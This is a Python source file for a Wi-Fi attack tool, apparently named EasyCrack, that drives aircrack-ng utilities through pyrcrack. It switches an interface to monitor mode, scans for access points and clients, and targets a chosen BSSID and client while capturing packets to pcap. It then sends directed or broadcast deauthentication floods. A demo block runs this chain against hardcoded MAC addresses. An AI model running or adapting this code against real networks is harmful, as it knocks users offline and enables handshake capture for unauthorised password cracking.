import os
import time
import subprocess

import pyrcrack.management
import pyrcrack.replaying
import pyrcrack.scanning

try:
    from easy_dump import EasyDump
    from easy_replay import EasyDeauth
except ImportError:
    from easy_crack.easy_dump import EasyDump
    from easy_crack.easy_replay import EasyDeauth


class EasyCrack(object):

    class __EasyCrack(object):

        def __init__(self, interface, using_8812au=True):
            self._get_status_lock = False
            self._results_cache = {}
            self._using_8812au = using_8812au
            self.interface = interface
            self._monkeypatch = None
            self._is_monitoring = False
            self._old_interface = None
            self._airodump_handle = None
            self._target_ap_essid = None
            self._target_ap_bssid = None
            self._target_channel = None
            self._target_client = None

        def _toggle_monitor_8812au(self):
            """
                Airmon-ng can't toggle monitor mode for the 8812au driver
                Why? Not sure, but I assume because fuck me, that's why.
                Anyway, it turns out that it can be toggled using iwconfig.  Use that here.
            """
            process_list = (
                ("ifconfig", [self.interface, "down"]),
                ("iwconfig", [self.interface, "mode", "managed" if self._is_monitoring else "monitor"]),
                ("ifconfig", [self.interface, "up"])
            )
            for proc_name, argument_list in process_list:
                process_handle = subprocess.Popen(
                    [proc_name, *argument_list],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                # This needs to be executed in order, so wait for each process to finish before moving on
                _, error = process_handle.communicate()
                # These processes don't normally output anything, but this should raise an error if any part fails.
                if error:
                    error = str(error, 'utf-8').strip()
                    raise ChildProcessError("{0} failed with error message {1}.  "
                                            "Do we have permission to manage network interfaces?"
                                            .format(proc_name, error))
            self._is_monitoring ^= True

        def _get_airodump_instance(self, **kwargs):
            if not self._is_monitoring:
                raise ValueError("EasyCrack must be in monitor mode before it can scan.")
            if self._airodump_handle is None:
                self._airodump_handle = EasyDump(self.interface, **kwargs)
            return self._airodump_handle

        def _reset_airodump_instance(self):
            if self._airodump_handle is not None:
                self._airodump_handle.stop()
                self._airodump_handle = None

        def _get_scan_results(self):
            # Combine the results of airodump.tree and airodump.clients for the sake of brevity
            airodump = self._get_airodump_instance()
            ap_list = airodump.tree
            client_list = airodump.get_clients()
            for client_information in client_list:
                ap_bssid = client_information["BSSID"]
                if ap_bssid in ap_list:
                    ap_list[ap_bssid]["clients"].append(client_information)
            self._results_cache = ap_list
            return ap_list

        def toggle_monitor(self):
            if self._using_8812au:
                return self._toggle_monitor_8812au()
            with pyrcrack.management.Airmon(self.interface) as airmon:
                if not self._is_monitoring:
                    airmon.start()
                    # Update self.interface to point to monitor-mode interface
                    self._old_interface = self.interface
                    self.interface = airmon.interface
                    print("Interface {0} is now set to monitor mode (Interface name: {1})".format(
                        self._old_interface, self.interface
                    ))
                    self._is_monitoring = True
                else:
                    airmon.stop()
                    self.interface = self._old_interface
                    self._old_interface = None
                    self._is_monitoring = False
                    print("Monitor mode disabled on interface: {0}".format(self.interface))

        def get_scan_state(self, rescan=False):
            return_value = {
                "target_essid": self._target_ap_essid,
                "target_bssid": self._target_ap_bssid,
                "target_client": self._target_client,
                "monitor_enabled": self._is_monitoring,
                "using_interface": self.interface,
                "scan_results": self._results_cache
            }
            if self._get_status_lock:
                return return_value
            self._get_status_lock = True
            if self._airodump_handle is None:
                rescan = True
            airodump = self._get_airodump_instance()
            if rescan:
                # Allow a newly-created airodump instance time to scan
                print("Rescanning on interface: {0}".format(self.interface))
                airodump.scan()
            print("Reading results from scan.")
            scan_results = self._get_scan_results()
            return_value["scan_results"] = scan_results
            self._get_status_lock = False
            return return_value

        def clear_target(self):
            while self._get_status_lock:
                time.sleep(1.0 / 2.0)
            self._get_status_lock = True
            self._target_ap_essid = None
            self._target_ap_bssid = None
            self._target_channel = None
            self._target_client = None
            self._reset_airodump_instance()
            airodump = self._get_airodump_instance()
            airodump.scan()
            self._get_status_lock = False

        def acquire_target(self, bssid, client):
            scan_output = self._get_scan_results()
            if bssid in scan_output:
                self._target_ap_bssid = bssid
                self._target_ap_essid = scan_output[bssid]["ESSID"]
                self._target_channel = scan_output[bssid]["channel"]
                self._target_client = client
                while self._get_status_lock:
                    time.sleep(1.0 / 2.0)
                self._get_status_lock = True
                self._reset_airodump_instance()
                if r"\x00\x00" not in self._target_ap_essid:
                    print(self._target_ap_essid)
                    airodump = self._get_airodump_instance(
                        essid=self._target_ap_essid,
                        bssid=self._target_ap_bssid,
                        channel=self._target_channel
                    )
                else:
                    airodump = self._get_airodump_instance(
                        bssid=self._target_ap_bssid,
                        channel=self._target_channel
                    )
                airodump.start(output_pcap=True)
                while not os.path.isfile(airodump.curr_csv):
                    print(airodump.curr_csv)
                    time.sleep(5)
                self._get_status_lock = False
                return True
            return False

        def launch_deauths(self, client=None, deauth_count=10):
            if self._target_ap_bssid is None or self._target_ap_essid is None:
                raise ValueError("A target must be acquired before a deauth attack can be launched.")
            kwargs = {
                "b": self._target_ap_bssid,
                "a": self._target_ap_essid
            }
            if client is not None:
                kwargs["c"] = client
            elif self._target_client is not None:
                kwargs["c"] = self._target_client
            if "c" in kwargs:
                message = "Launching directed deauth attack against AP {0} client {1}".format(self._target_ap_bssid,
                                                                                              self._target_client)
            else:
                message = "Launching broadcast deauth attack against AP {0}".format(self._target_ap_bssid)
            print(message)
            aireplay = EasyDeauth(interface=self.interface, **kwargs)
            aireplay.start(deauth_count)

        def stop(self):
            airodump = self._get_airodump_instance()
            airodump.stop()

    _instance = None

    def __new__(cls, interface):
        if EasyCrack._instance is None:
            EasyCrack._instance = EasyCrack.__EasyCrack(interface)
        EasyCrack._instance.interface = interface
        return EasyCrack._instance


if __name__ == "__main__":
    EasyCrack("wlan1").toggle_monitor()
    for i in range(3):
        print(EasyCrack("wlan1").get_scan_state())
        time.sleep(10)
    print("Acquiring target . . .")
    EasyCrack("wlan1").acquire_target('9C:3D:CF:5C:C9:97', client='FC:A1:83:FB:F0:0C')
    for i in range(3):
        print(EasyCrack("wlan1").get_scan_state())
        time.sleep(10)
    for i in range(3):
        EasyCrack("wlan1").launch_deauths()
    for i in range(3):
        print(EasyCrack("wlan1").get_scan_state())
        time.sleep(10)
    EasyCrack("wlan1").stop()
